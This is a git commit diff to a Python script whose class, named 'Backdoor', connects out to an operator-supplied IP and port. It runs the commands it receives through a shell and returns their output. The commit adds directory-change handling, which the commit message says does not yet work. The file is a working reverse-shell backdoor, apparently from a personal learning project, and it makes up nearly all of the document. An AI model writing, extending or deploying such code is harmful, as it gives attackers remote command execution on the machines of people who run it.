4952b8ebc93819625716a1f599a099c0a1776a64
benrobbins20 <72369539+benrobbins20@users.noreply.github.com>
2022-03-06 23:01:31 -0700

    CURRENTLY NOT WORKING WITH CD
    need to troubleshoot how to pass in path with spaces

--- sendAndReceiveWListener.py
+++ sendAndReceiveWListener.py
@@ -1,4 +1,5 @@
-import subprocess, sys, socket, json, argparse
+import subprocess, sys, socket, json, argparse, os
+
 
 class Args:
     def __init__(self):
@@ -12,6 +13,8 @@ class Args:
 
 
 class Backdoor:
+    
+    
     def __init__(self,ip,port):
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
@@ -19,7 +22,24 @@ class Backdoor:
         except ConnectionRefusedError:
             sys.exit()
         
-  
+    
+    def cd(self,path):
+        try:
+            print('path:',path)
+            fullPath = path[1:] # path will be everything following cd command
+            print('fullPath:',fullPath)
+            fullPathJoin = ' '.join(fullPath)
+            print('fullPathJoin:',fullPathJoin)
+            os.chdir(path)
+            return f"Changing directory\n>>\"{path}\""
+        except PermissionError:
+            self.sendStream('PermissionError, change directory command not accepted by target')
+        except FileNotFoundError:
+            self.sendStream('FileNotFoundError, change directory command not accepted by target')
+        except OSError:
+            self.sendStream('OSError, change directory command not accepted by target')
+            
+        
 
     def executeCmd(self,cmd):
         cmd = subprocess.check_output(cmd,shell=True)
@@ -46,31 +66,29 @@ class Backdoor:
     def run(self):
         while True:
             #print('run1')
-            cmdIn = self.recvStream()
+            self.cmdIn = self.recvStream()
             #print(cmdIn)
-            #print('run1')
-            #cmdIn = cmdIn.decode()
-            #print(cmdIn)
-            if cmdIn != 'bye':
-
-                try:
-                    #print('run3_TRY')
-                    cmdOut = self.executeCmd(cmdIn)
-                    #print('run4_TRY')
-                    #print(cmdOut)
-                    cmdOut = cmdOut.decode('utf-8')
-                    #print(cmdOut)
-                    self.sendStream(cmdOut)
-                    #print('run5_TRYPOSTSEND')
-                except subprocess.CalledProcessError:
-                    self.sendStream('Subprocess Error, shell command not accepted by target')
-            else:
+            #print('run2')
+            if self.cmdIn[0] == 'bye':
                 #print('bye')
                 self.connection.close()
                 exit()
+            elif self.cmdIn[0] == 'cd' and len(self.cmdIn) > 1:
 
-
-
+                #print('trying CD') #meaning cmdIn = ['cd','c:\\'] is len() = 2
+                self.cmdOut = self.cd(self.cmdIn[1]) #must pass in the entire absolute path for the argument of cd
+                self.sendStream(self.cmdOut)
+            else:   
+                #print('run3_PRE_TRY')
+                try:
+                    self.cmdOut = self.executeCmd(self.cmdIn)
+                except subprocess.CalledProcessError:
+                    self.sendStream('Subprocess Error, shell command not accepted by target')  
+                #print('run4_POST_TRY')
+                self.cmdOut = self.cmdOut.decode('utf-8')
+                #print(cmdOut)
+                self.sendStream(self.cmdOut)
+                   
 
 
 try:
@@ -85,4 +103,5 @@ except ConnectionResetError:
     sys.exit()
 except ConnectionRefusedError:
     sys.exit()
+
 
